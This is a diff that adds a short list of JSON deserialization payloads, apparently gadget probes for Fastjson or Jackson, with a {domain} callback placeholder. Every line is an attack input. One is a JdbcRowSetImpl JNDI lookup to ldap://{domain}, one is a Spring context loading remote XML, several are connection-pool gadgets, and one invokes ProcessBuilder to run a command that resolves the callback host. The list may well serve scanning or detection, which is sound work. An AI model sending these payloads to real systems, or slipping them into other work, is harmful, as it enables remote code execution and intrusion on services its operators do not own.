@@ -1,0 +1,8 @@
+{"@type":"java.lang.Object"}
+{"@class":"java.lang.Runtime"}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/x","autoCommit":true}
+{"@class":"org.springframework.context.support.FileSystemXmlApplicationContext","path":"http://{domain}/xml"}
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"evil"}
+{"@class":"br.com.anteros.dbcp.AnterosDBCPConfig"}
+{"@type":"ch.qos.logback.core.db.DriverManagerDataSource","connectionUrl":"jdbc:mysql://{domain}/test"}
+{"name":{"@type":"java.lang.Class","val":"java.lang.ProcessBuilder"},"value":"getent hosts {domain}"}
